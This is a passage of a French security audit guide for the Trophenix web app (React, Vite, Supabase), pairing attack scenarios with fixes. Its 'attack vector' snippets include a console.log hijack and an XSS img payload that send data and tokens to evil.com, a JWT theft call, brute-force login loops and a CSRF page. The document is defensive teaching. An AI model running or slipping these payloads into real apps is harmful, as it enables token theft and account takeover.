// 1. Voir tous les logs (emails, erreurs, tokens temporaires)
// 2. Overrider console.log pour capturer les données
const originalLog = console.log;
console.log = function(...args) {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(args)
  });
  originalLog.apply(console, args);
};
```

**Impact** : 🟠 HAUTE
- Fuite d'informations sensibles
- Aide au reconnaissance pour les attaquants
- Exposition de la structure de données

**Solution** :

```typescript
// ✅ src/utils/logger.ts
const isDevelopment = import.meta.env.DEV;
const isProduction = import.meta.env.PROD;

export const logger = {
  debug: (...args: any[]) => {
    if (isDevelopment) {
      console.debug('[DEBUG]', ...args);
    }
  },

  info: (...args: any[]) => {
    if (isDevelopment) {
      console.info('[INFO]', ...args);
    }
  },

  error: (message: string, error?: Error) => {
    if (isDevelopment) {
      console.error('[ERROR]', message, error);
    }

    // En production : envoyer à un service de monitoring (Sentry, etc.)
    if (isProduction) {
      // sendToErrorTracking(message, error);
    }
  },

  // JAMAIS loguer les données sensibles
  sanitize: (data: any) => {
    const sensitive = ['password', 'token', 'apikey', 'secret', 'jwt'];
    const sanitized = { ...data };

    Object.keys(sanitized).forEach(key => {
      if (sensitive.some(s => key.toLowerCase().includes(s))) {
        sanitized[key] = '[REDACTED]';
      }
    });

    return sanitized;
  }
};

// ✅ Utilisation
import { logger } from '@/utils/logger';

const result = await supabase.auth.signUp({ email, password });
logger.debug('SignUp result:', logger.sanitize(result));
```

---

### 5. ⚠️ MOYENNE : Pas de Rate Limiting côté frontend

**Problème** : Rien n'empêche un attaquant de spammer les endpoints

**Vecteur d'attaque** :
```javascript
// Brute force login
for (let i = 0; i < 10000; i++) {
  await fetch('https://ufitfifaimndezqmczgd.supabase.co/auth/v1/token', {
    method: 'POST',
    body: JSON.stringify({
      email: 'victim@example.com',
      password: passwords[i]
    })
  });
}

// DDoS l'API
while(true) {
  fetch('/api/athletes');
}
```

**Impact** : 🟡 MOYENNE
- Brute force des comptes
- DDoS de l'application
- Coûts d'infrastructure élevés

**Solution** :

```typescript
// ✅ src/utils/rateLimiter.ts
class RateLimiter {
  private attempts: Map<string, number[]> = new Map();

  canMakeRequest(key: string, maxAttempts: number = 5, windowMs: number = 60000): boolean {
    const now = Date.now();
    const userAttempts = this.attempts.get(key) || [];

    // Filtrer les tentatives dans la fenêtre de temps
    const recentAttempts = userAttempts.filter(time => now - time < windowMs);

    if (recentAttempts.length >= maxAttempts) {
      return false;
    }

    // Ajouter la tentative actuelle
    recentAttempts.push(now);
    this.attempts.set(key, recentAttempts);

    return true;
  }

  reset(key: string) {
    this.attempts.delete(key);
  }
}

export const rateLimiter = new RateLimiter();

// ✅ Utilisation dans authService.ts
static async signIn(email: string, password: string): Promise<AuthResult> {
  const rateLimitKey = `login_${email}`;

  if (!rateLimiter.canMakeRequest(rateLimitKey, 5, 300000)) {
    return {
      success: false,
      error: 'Trop de tentatives. Réessayez dans 5 minutes.'
    };
  }

  try {
    const { data, error } = await supabase.auth.signInWithPassword({
      email,
      password,
    });

    if (error) {
      return { success: false, error: error.message };
    }

    // Reset le rate limit en cas de succès
    rateLimiter.reset(rateLimitKey);

    return { success: true, data };
  } catch (error: any) {
    return { success: false, error: error.message };
  }
}
```

---

### 6. ⚠️ MOYENNE : Pas de protection CSRF

**Problème** : Pas de CSRF tokens

**Vecteur d'attaque** :
```html
<!-- Site malveilleux evil.com -->
<html>
<body>
  <script>
    // L'utilisateur est connecté à Trophenix
    // evil.com peut faire des requêtes en son nom
    fetch('https://trophenix.com/api/profile', {
      method: 'DELETE',
      credentials: 'include' // Inclut les cookies de session
    });
  </script>
</body>
</html>
```

**Impact** : 🟡 MOYENNE
- Actions non autorisées au nom de l'utilisateur
- Modification/suppression de données
- Création de comptes

**Solution** :

```typescript
// ✅ src/utils/csrf.ts
export const csrfToken = {
  generate(): string {
    return crypto.randomUUID();
  },

  store(token: string) {
    sessionStorage.setItem('csrf_token', token);
  },

  get(): string | null {
    return sessionStorage.getItem('csrf_token');
  },

  validate(token: string): boolean {
    return token === this.get();
  }
};

// ✅ Intercepteur pour toutes les requêtes
import { supabase } from './lib/supabase';

// Ajouter le CSRF token à toutes les requêtes
const originalRequest = supabase.http.request;
supabase.http.request = function(options) {
  const token = csrfToken.get();
  if (token) {
    options.headers = {
      ...options.headers,
      'X-CSRF-Token': token
    };
  }
  return originalRequest.call(this, options);
};
```

**ET côté backend** :

```python
# backend/middleware.py
from django.middleware.csrf import CsrfViewMiddleware

class CustomCSRFMiddleware(CsrfViewMiddleware):
    def process_view(self, request, callback, callback_args, callback_kwargs):
        # Vérifier le token CSRF dans le header
        if request.method in ('POST', 'PUT', 'DELETE', 'PATCH'):
            token = request.META.get('HTTP_X_CSRF_TOKEN')
            if not token or not self._compare_tokens(token, request.COOKIES.get('csrftoken')):
                return JsonResponse({'error': 'CSRF token missing or invalid'}, status=403)
        return super().process_view(request, callback, callback_args, callback_kwargs)
```

---

### 7. ⚠️ BASSE : Pas de Subresource Integrity (SRI)

**Problème** : CDN compromis pourrait injecter du code malveillant

**Vecteur d'attaque** :
```html
<!-- Si vous utilisez des CDN externes -->
<script src="https://cdn.example.com/library.js"></script>
<!-- Si le CDN est hacké, code malveilleux exécuté -->
```

**Impact** : 🟢 BASSE (pas de CDN externe actuellement)

**Solution** :
```html
<!-- ✅ Si vous ajoutez des CDN, toujours avec SRI -->
<script
  src="https://cdn.example.com/library.js"
  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/ux..."
  crossorigin="anonymous"
></script>
```

---

### 8. ⚠️ BASSE : Pas de monitoring/alerting

**Problème** : Aucune détection des attaques en temps réel

**Impact** : 🟢 BASSE (mais critique pour détecter les attaques)

**Solution** :

```typescript
// ✅ src/utils/monitoring.ts
interface SecurityEvent {
  type: 'failed_login' | 'suspicious_activity' | 'rate_limit_exceeded' | 'xss_attempt';
  details: any;
  timestamp: number;
  userAgent: string;
  ip?: string;
}

class SecurityMonitor {
  private events: SecurityEvent[] = [];

  log(type: SecurityEvent['type'], details: any) {
    const event: SecurityEvent = {
      type,
      details,
      timestamp: Date.now(),
      userAgent: navigator.userAgent
    };

    this.events.push(event);

    // Envoyer à un service de monitoring (Sentry, LogRocket, etc.)
    if (import.meta.env.PROD) {
      this.sendToMonitoring(event);
    }

    // Alerter si trop d'événements suspects
    if (this.events.length > 10) {
      this.triggerAlert();
    }
  }

  private sendToMonitoring(event: SecurityEvent) {
    // Intégration avec Sentry, DataDog, etc.
    fetch('/api/security-events', {
      method: 'POST',
      body: JSON.stringify(event)
    });
  }

  private triggerAlert() {
    console.error('🚨 SECURITY ALERT: Multiple suspicious activities detected');
    // Notifier l'équipe de sécurité
  }
}

export const securityMonitor = new SecurityMonitor();

// ✅ Utilisation
import { securityMonitor } from '@/utils/monitoring';

// Après un échec de connexion
if (loginError) {
  securityMonitor.log('failed_login', { email, error: loginError });
}

// Détection de tentative XSS
if (input.includes('<script>')) {
  securityMonitor.log('xss_attempt', { input });
}
```

---

## 🛡️ Configuration Vite sécurisée

```typescript
// ✅ vite.config.ts
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],

  // ✅ Build sécurisé
  build: {
    sourcemap: false, // Ne pas exposer le code source
    minify: 'terser',
    terserOptions: {
      compress: {
        drop_console: true, // Supprimer tous les console.log en prod
        drop_debugger: true,
      },
    },
    rollupOptions: {
      output: {
        // Obfuscation des noms de fichiers
        entryFileNames: 'assets/[name]-[hash].js',
        chunkFileNames: 'assets/[name]-[hash].js',
        assetFileNames: 'assets/[name]-[hash].[ext]',
      },
    },
  },

  // ✅ Headers de sécurité
  server: {
    headers: {
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'X-XSS-Protection': '1; mode=block',
      'Referrer-Policy': 'strict-origin-when-cross-origin',
    },
  },

  optimizeDeps: {
    exclude: ['lucide-react'],
  },
});
```

---

## 🔐 Checklist de sécurité complète

### Avant le déploiement

- [ ] **CSP** : Content Security Policy configurée dans `index.html`
- [ ] **Headers de sécurité** : X-Frame-Options, X-Content-Type-Options, etc.
- [ ] **RLS Supabase** : TOUTES les tables ont RLS activé
- [ ] **Validation forte** : Mot de passe minimum 12 caractères avec complexité
- [ ] **Sanitization** : Tous les inputs utilisateurs sont sanitisés
- [ ] **Rate limiting** : Frontend ET backend
- [ ] **CSRF protection** : Tokens CSRF sur toutes les mutations
- [ ] **Logs sécurisés** : Pas de données sensibles dans les logs production
- [ ] **Monitoring** : Alertes configurées pour activités suspectes
- [ ] **Dependencies** : `npm audit` sans vulnérabilités HIGH/CRITICAL
- [ ] **Sourcemaps** : Désactivés en production
- [ ] **console.log** : Supprimés en production
- [ ] **HTTPS** : SEULEMENT HTTPS en production (pas de HTTP)
- [ ] **SRI** : Subresource Integrity pour tout CDN externe

### Tests de pénétration

```bash
# ✅ Commandes pour tester votre sécurité

# 1. Scan des vulnérabilités npm
npm audit

# 2. Tester les headers de sécurité
curl -I https://trophenix.com

# 3. Tester CSP
# Ouvrir la console browser et essayer :
eval('alert("XSS")'); // Doit être bloqué par CSP

# 4. Tester RLS Supabase
# Essayer d'accéder aux données d'un autre user

# 5. Brute force protection
# Essayer 10+ connexions échouées rapidement
```

---

## 🎯 Scénarios d'attaque et défenses

### Scénario 1 : XSS (Cross-Site Scripting)

**Attaque** :
```javascript
// Attaquant injecte dans un champ de commentaire
<img src=x onerror="fetch('https://evil.com/steal?token='+localStorage.getItem('token'))">
```

**Défense** :
```typescript
// ✅ Sanitization stricte
import DOMPurify from 'dompurify';

const cleanInput = DOMPurify.sanitize(userInput);

// ✅ CSP bloque l'exécution de scripts inline
// ✅ Utiliser textContent au lieu de innerHTML
element.textContent = userInput; // Pas d'exécution de HTML
```

### Scénario 2 : SQL Injection (via Supabase)

**Attaque** :
```javascript
// Tentative d'injection
const email = "admin'--";
await supabase.from('profiles').select('*').eq('email', email);
```

**Défense** :
```sql
-- ✅ Supabase utilise des prepared statements (protégé)
-- ✅ RLS empêche l'accès non autorisé
-- ✅ Validation stricte des inputs côté frontend ET backend
```

### Scénario 3 : Session Hijacking

**Attaque** :
```javascript
// Vol du JWT token via XSS
const token = localStorage.getItem('supabase.auth.token');
fetch('https://evil.com/steal', { method: 'POST', body: token });
```

**Défense** :
```typescript
// ✅ CSP empêche XSS
// ✅ HttpOnly cookies (Supabase utilise localStorage, mais avec refresh tokens courts)
// ✅ JWT expiration courte (1h par défaut)
// ✅ Refresh token rotation
```

### Scénario 4 : Account Takeover

**Attaque** :
```javascript
// Brute force du mot de passe
for (const pwd of commonPasswords) {
  await supabase.auth.signInWithPassword({ email: 'victim@example.com', password: pwd });
}
```

**Défense** :
```typescript
// ✅ Rate limiting (5 tentatives / 5 minutes)
// ✅ Mot de passe fort obligatoire (12+ caractères, complexité)
// ✅ Blocage temporaire après X tentatives échouées
// ✅ Email d'alerte après tentatives suspectes
// ✅ 2FA (à implémenter)
```

### Scénario 5 : Data Exfiltration

**Attaque** :
```javascript
// Extraction massive de données
const allProfiles = await supabase.from('profiles').select('*');
const allAthletes = await supabase.from('athlete_profiles').select('*');
// Envoyer vers un serveur externe
```

**Défense** :
```sql
-- ✅ RLS empêche la lecture de données non autorisées
CREATE POLICY "Users can only read own profile"
  ON profiles FOR SELECT
  USING (auth.uid() = id);

-- ✅ Rate limiting sur les requêtes
-- ✅ Monitoring des requêtes suspectes (volume anormal)
-- ✅ Pagination obligatoire (pas de select * sans limite)
```

---

## 🚀 Plan d'action prioritaire

### Phase 1 : URGENT (à faire immédiatement)

1. **Ajouter CSP dans index.html** ← 30 minutes
2. **Activer RLS sur TOUTES les tables Supabase** ← 1 heure
3. **Renforcer validation des mots de passe** ← 1 heure
4. **Configurer Vite pour build sécurisé** ← 30 minutes
5. **Supprimer les console.log en production** ← 30 minutes

**Temps total : ~4 heures**

### Phase 2 : IMPORTANT (cette semaine)

6. **Implémenter rate limiting frontend** ← 2 heures
7. **Ajouter sanitization des inputs** ← 2 heures
8. **Configurer monitoring/alerting** ← 3 heures
9. **Tests de pénétration basiques** ← 4 heures

**Temps total : ~11 heures**

### Phase 3 : RECOMMANDÉ (ce mois)

10. **CSRF protection** ← 3 heures
11. **2FA (authentification à deux facteurs)** ← 8 heures
12. **Audit de sécurité professionnel** ← Budget externe
13. **Tests de pénétration avancés** ← Budget externe

**Temps total : ~11 heures + budget externe**

---

## 📊 Score de sécurité actuel

| Catégorie            | Score | Commentaire                                      |
| -------------------- | ----- | ------------------------------------------------ |
| **Authentification** | 6/10  | Supabase OK, mais mots de passe faibles acceptés |
| **Autorisation**     | 8/10  | RLS activé, mais à vérifier partout              |
| **Validation**       | 4/10  | Validation côté client uniquement, trop faible   |
| **Logging**          | 3/10  | Logs exposent des données sensibles              |
| **Headers sécurité** | 2/10  | Aucun header de sécurité configuré               |
| **Monitoring**       | 1/10  | Aucun monitoring des attaques                    |
| **Rate limiting**    | 2/10  | Seulement côté Supabase (basique)                |
| **CSRF**             | 0/10  | Aucune protection CSRF                           |
| **XSS**              | 3/10  | Pas de CSP, sanitization minimale                |
| **Dependencies**     | 7/10  | Peu de dépendances, mais non auditées            |

**Score global : 3.6/10** ⚠️

**Après Phase 1 : 6.5/10** ✅
**Après Phase 2 : 8.0/10** 🎯
**Après Phase 3 : 9.5/10** 🔒

---

## 🔗 Ressources

### Documentation

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Supabase Security Best Practices](https://supabase.com/docs/guides/auth/auth-deep-dive/auth-row-level-security)
- [CSP MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
- [CSRF Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### Outils

- `npm audit` - Scanner les vulnérabilités
- [Snyk](https://snyk.io/) - Scan continu des dépendances
- [Observatory](https://observatory.mozilla.org/) - Test headers de sécurité
- [OWASP ZAP](https://www.zaproxy.org/) - Tests de pénétration

---

## ✅ Résumé

| Vulnérabilité           | Criticité  | Temps de fix | Priorité |
| ----------------------- | ---------- | ------------ | -------- |
| Pas de CSP              | 🔴 CRITIQUE | 30 min       | 1        |
| RLS non vérifié partout | 🔴 CRITIQUE | 1h           | 2        |
| Validation faible       | 🟠 HAUTE    | 1h           | 3        |
| Logs sensibles          | 🟠 HAUTE    | 30 min       | 4        |
| Pas de rate limiting    | 🟡 MOYENNE  | 2h           | 5        |
| Pas de CSRF             | 🟡 MOYENNE  | 3h           | 6        |
| Pas de monitoring       | 🟢 BASSE    | 3h           | 7        |

**Le frontend actuel est VULNÉRABLE à plusieurs attaques critiques.**

**Action immédiate requise pour la Phase 1 avant tout test de pénétration.**

---

**Prêt pour l'audit de sécurité après implémentation de ce guide !** 🛡️